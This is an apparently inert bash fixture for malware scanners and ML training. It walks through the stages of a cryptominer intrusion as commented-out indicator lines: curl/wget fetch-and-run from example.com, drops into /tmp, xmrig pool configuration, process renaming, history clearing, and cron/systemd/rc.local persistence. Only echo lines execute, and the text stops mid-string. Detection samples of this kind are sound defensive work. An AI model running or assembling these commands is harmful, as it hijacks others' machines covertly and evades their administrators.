#!/bin/bash
# ============================================================
# SAMPLE MINER PAYLOAD (INERT)
# FOR SECURITY SCANNING / ML TRAINING ONLY
# DO NOT EXECUTE
# ============================================================

# ---------------------------
# Stage 1: Delivery (Indicators)
# ---------------------------

# curl -fsSL http://example.com/xmrig.sh | bash
# wget -q http://example.com/xmrig -O /tmp/.x
# busybox wget http://example.com/m

echo "download stage detected: curl | bash / wget"

# ---------------------------
# Stage 2: Drop Location
# ---------------------------

# /tmp/.x
# /dev/shm/.miner
# /var/tmp/kworker

echo "suspicious drop locations referenced"

# ---------------------------
# Stage 3: Permission & Launch
# ---------------------------

# chmod +x /tmp/.x
# nohup /tmp/.x &
# setsid ./xmrig
# screen -dm ./xmrig

echo "execution intent: chmod +x, nohup, setsid"

# ---------------------------
# Stage 4: Mining Configuration
# ---------------------------

# ./xmrig \
#   --algo=rx/0 \
#   --coin monero \
#   --url stratum+tcp://pool.example:3333 \
#   --user WALLET_ID \
#   --pass x \
#   --donate-level=1 \
#   --rig-id server01

echo "mining flags detected: rx/0, stratum+tcp, wallet"

# ---------------------------
# Stage 5: Resource Control
# ---------------------------

# --max-cpu-usage=70
# --threads=$(nproc)
# taskset -c 0-3
# nice -n 19
# cpulimit -l 60

echo "cpu throttling and affinity patterns"

# ---------------------------
# Stage 6: Stealth Techniques
# ---------------------------

# >/dev/null 2>&1
# --log-file=/dev/null
# exec -a kthreadd ./xmrig
# exec -a systemd ./xmrig
# unset HISTFILE
# history -c

echo "stealth indicators: log suppression, process rename"

# ---------------------------
# Stage 7: Persistence
# ---------------------------

# crontab -l | echo '@reboot xmrig' | crontab -
# echo '*/10 * * * * xmrig' >> /etc/crontab
# systemctl enable sys-update
# systemctl start sys-update
# echo '/tmp/.x &' >> /etc/rc.local

echo "persistence mechanisms: cron, systemd, rc.local"

# ---------------------------
# Stage 8: Watchdog / Self-Healing
# ---------------------------

# while true; do
#   pgrep xmrig || /tmp/.x
#   sleep 5
# done

echo "watchdog loop logic det
